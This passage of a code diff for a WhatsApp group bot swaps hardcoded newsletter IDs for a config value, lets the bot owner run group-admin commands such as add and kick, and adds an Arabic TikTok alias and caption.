                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13904,7 +13941,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14107,7 +14144,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14249,7 +14286,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14346,7 +14383,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14418,7 +14455,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14490,7 +14527,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14562,7 +14599,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14634,7 +14671,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14719,7 +14756,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14792,7 +14829,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14865,7 +14902,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14937,7 +14974,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15009,7 +15046,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15080,7 +15117,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15152,7 +15189,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15355,7 +15392,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			// Group Menu
 			case 'add': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`EXAMPLE: ${prefix + command} 91xxx`)
@@ -15385,7 +15422,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'kick': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`Example: ${prefix + command} 91xxx`)
@@ -15397,7 +15434,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'promote': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`Example: ${prefix + command} 91xxx`)
@@ -15410,7 +15447,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'demote': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`Example: ${prefix + command} 91xxx`)
@@ -15423,7 +15460,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`Example: ${prefix + command} text`)
@@ -15435,7 +15472,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
 					replygcxeon(`Example: ${prefix + command} textnya`)
@@ -15452,7 +15489,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'setgruppp':
             case 'setgcpp':
                 if (!m.isGroup) return XeonStickGroup()
-                if (!m.isAdmin) return replygcxeon(mess.admin)
+                if (!m.isAdmin && !XeonTheCreator) return replygcxeon(mess.admin)
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
                 if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                 if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image Caption Caption ${prefix + command}`)
@@ -15494,7 +15531,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				let response = await XeonBotInc.groupInviteCode(m.chat)
 				await XeonBotInc.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await XeonBotInc.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
@@ -15502,7 +15539,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				await XeonBotInc.groupRevokeInvite(m.chat).then((a) => {
 					replygcxeon(`Reset Success, Group Invite Link ${m.metadata.subject}`)
@@ -15511,7 +15548,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'group': case 'grup': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (text === 'close') {
 					await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`*Successfully Closing The Group*`))
@@ -15550,7 +15587,7 @@ if (!XeonTheCreator) return XeonStickOwner()
     break
 			case 'antidelete': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (text === 'on') {
 					if (db.groups[m.chat].antidelete) return replygcxeon('*Sudah Aktif Sebelumnya*')
@@ -15579,7 +15616,7 @@ if (!XeonTheCreator) return XeonStickOwner()
 			break
 			case 'tagall': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				let teks = `*Tag All*\n\n*Message :* ${q ? q : ''}\n\n`
 				for (let mem of m.metadata.participants) {
@@ -15590,14 +15627,14 @@ if (!XeonTheCreator) return XeonStickOwner()
 			break
 			case 'hidetag': case 'h': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
 			}
 			break
 			case 'totag': {
 				if (!m.isGroup) return XeonStickGroup()
-				if (!m.isAdmin) return XeonStickAdmin()
+				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
 				delete m.quoted.chat
@@ -16316,7 +16353,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16456,7 +16493,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16542,7 +16579,7 @@ ${themeemoji} Title: ${result.title}`;
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16582,7 +16619,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16596,13 +16633,13 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
   }
 }
 break
-			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
+			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'تيك': case 'tiktokvideo': {
 				if (!text) return replygcxeon(`Example: ${prefix + command} url_tiktok`)
 				if (!text.includes('tiktok.com')) return replygcxeon('Url Tidak Mengandung Result Dari Tiktok!')
 				const hasil = await tiktokDl(text);
 				XeonStickWait()
 				if (hasil.size_nowm) {
-					await XeonBotInc.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
+					await XeonBotInc.sendFileUrl(m.chat, hasil.data[1].url, `*╮┄╌〔 ≪ مـارو بـوت ≫ 〕╌╌•*\n*┆✔️ تفضل طلبك*\n*╯────ׂ─ׂ─ׂ─ׂ─────╌─╌─╌*`, m)
 				} else {
 					for (let i = 0; i < hasil.data.length; i++) {
 						await XeonBotInc.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
@@ -16928,7 +16965,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -17062,7 +17099,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17222,7 +17259,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17999,7 +18036,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -18133,7 +18170,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18214,7 +18251,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18439,7 +18476,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -18573,7 +18610,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18654,7 +18691,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18858,7 +18895,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -18992,7 +19029,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19073,7 +19110,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19232,7 +19269,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -19366,7 +19403,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19447,7 +19484,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19479,7 +19516,7 @@ let xmenu_oh = `
 │${setv} ${prefix}xnxxdl 🅕
 │${setv} ${prefix}xvideodl 🅕
 │${setv} ${prefix}itunes 🅕
-│${setv} ${prefix}play 🅕
+│${setv} ${prefix}play ??
 │${setv} ${prefix}ytmp3 🅕
 │${setv} ${prefix}ytmp4 🅕
 │${setv} ${prefix}tiktok 🅕
@@ -19620,7 +19657,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -19754,7 +19791,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19835,7 +19872,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20025,7 +20062,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20159,7 +20196,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20240,7 +20277,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20399,7 +20436,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20533,7 +20570,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20614,7 +20651,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20818,7 +20855,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20952,7 +20989,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21033,7 +21070,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21188,7 +21225,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -21322,7 +21359,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21403,7 +21440,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21554,7 +21591,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -21688,7 +21725,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21769,7 +21806,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21935,7 +21972,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -22069,7 +22106,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22150,7 +22187,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22311,7 +22348,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -22445,7 +22482,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22526,7 +22563,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22737,7 +22774,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -22871,7 +22908,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22952,7 +22989,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23106,7 +23143,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -23240,7 +23277,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23321,7 +23358,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23603,7 +23640,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -23737,7 +23774,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23818,7 +23855,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23979,7 +24016,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24113,7 +24150,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
